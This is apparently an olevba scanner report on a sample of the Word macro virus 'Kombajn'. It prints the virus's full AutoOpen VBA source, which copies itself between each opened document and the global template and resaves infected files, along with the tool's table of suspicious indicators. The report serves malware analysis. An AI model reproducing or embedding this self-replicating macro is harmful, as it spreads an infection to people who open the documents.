olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Kombajn
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Kombajn - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Kombajn - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "KOMBAJN"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim SrcPath$
SrcPath$ = WordBasic.[FileName$](0)
If WordBasic.[MacroFileName$]("AutoOpen") = SrcPath$ Then
    On Error GoTo -1: On Error GoTo magy
    WordBasic.MacroCopy SrcPath$ + ":AutoOpen", "Global:AutoOpen"
    GoTo oke
magy:
    On Error GoTo -1: On Error GoTo oke
    WordBasic.MacroCopy SrcPath$ + ":AutoOpen", "Globális:AutoOpen"
oke:
Else
    On Error GoTo -1: On Error GoTo magy2
    WordBasic.MacroCopy "Global:AutoOpen", SrcPath$ + ":AutoOpen"
    GoTo ok2
magy2:
    On Error GoTo -1: On Error GoTo ok2
    WordBasic.MacroCopy "Globális:AutoOpen", SrcPath$ + ":AutoOpen"
ok2:
On Error GoTo -1: On Error GoTo ki
WordBasic.FileSaveAs Name:=SrcPath$, Format:=1
End If
If WordBasic.Int(Rnd() * 10) < 4 Then
    WordBasic.MsgBox "Most nem bántalak! (KOMBAJN)"
End If
ki:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

